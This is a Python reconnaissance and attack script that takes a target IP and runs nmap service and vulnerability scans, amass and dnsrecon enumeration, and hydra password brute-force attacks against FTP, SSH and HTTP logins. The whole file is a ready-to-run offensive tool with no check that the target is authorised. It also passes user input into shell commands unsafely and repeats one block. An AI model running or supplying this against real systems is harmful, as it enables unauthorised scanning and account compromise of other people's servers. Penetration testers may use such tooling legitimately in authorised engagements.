import subprocess
import sys


def recon_recommendations(target_ip,
                          basic_ports="21,22,25,53,80,110,135,139,143,443,445,1433,1521,3306,3389,5432,5900,8080,"
                                      "8443,9100",
                          full_ports="1-10000"):
    """
    Print reconnaissance recommendations for a given target IP address and port ranges.
    """
    print(f"[+] Target IP address: {target_ip}")
    print(f"[+] Basic scan ports: {basic_ports}")
    print(f"[+] Full scan ports: {full_ports}\n")

    # Basic Scan Output
    print("[+] Basic scan output:")
    subprocess.run(f"nmap -p {basic_ports} -sV {target_ip}", shell=True)
    print()

    # Full Scan Output
    print("[+] Full scan output:")
    subprocess.run(f"nmap -p {full_ports} -sV -sC -A -Pn {target_ip}", shell=True)
    print()

    # Recommended recon commands
    print("[+] Recommended recon commands:")
    recommended_commands = [
        f"nmap -p 80,443 --script http-title {target_ip}",
        f"nmap -p 80,443 --script http-headers {target_ip}",
        f"nmap -p 80,443 --script ssl-cert {target_ip}",
        # Add more commands here as needed
    ]
    for cmd in recommended_commands:
        subprocess.run(cmd, shell=True)
        print()

    # Enumerating open ports and services
    print("[+] Enumerating open ports and services:")
    subprocess.run(f"nmap -p- --script vuln {target_ip}", shell=True)
    print()

    # Extracting subdomains and hosts
    print("[+] Extracting subdomains and hosts:")
    subprocess.run(f"amass enum -d {target_ip} -o amass.txt", shell=True)
    subprocess.run(
        "cat amass.txt | grep -v '^#' | awk '{print $2}' | sort -u | httpx -silent -threads 10 -title -content-length "
        "-status-code > subdomains.txt",
        shell=True)
    print()

    # Perform DNS enumeration
    print("[+] Performing DNS enumeration:")
    subprocess.run(f"dnsrecon -d {target_ip} -D /usr/share/dnsrecon/small.dict -t A -n 8.8.8.8 -r 1.1.1.1 -v -w dns.txt",
                   shell=True)
    subprocess.run(
        "cat dns.txt | grep -v '^#' | awk '{print $1}' | sort -u | httpx -silent -threads 10 -title -content-length "
        "-status-code >> subdomains.txt",
        shell=True)
    print()

    # Perform brute-force attacks
    print("[+] Performing brute-force attacks:")
    subprocess.run(f"hydra -L users.txt -P passwords.txt -s 21 -u {target_ip} ftp", shell=True)
    subprocess.run(f"hydra -L users.txt -P passwords.txt -s 22 -u {target_ip} ssh", shell=True)
    subprocess.run(f"hydra -L users.txt -P passwords.txt -s 80 -u {target_ip} http-get", shell=True)
    print()

    print("[+] Extracting subdomains and hosts:")
    subprocess.run(f"amass enum -d {target_ip} -o amass.txt", shell=True)
    subprocess.run(
        "cat amass.txt | grep -v '^#' | awk '{print $2}' | sort -u | httpx -silent -threads 10 -title -content-length "
        "-status-code > subdomains.txt",
        shell=True)
    print()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python scanning.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    recon_recommendations(target_ip)
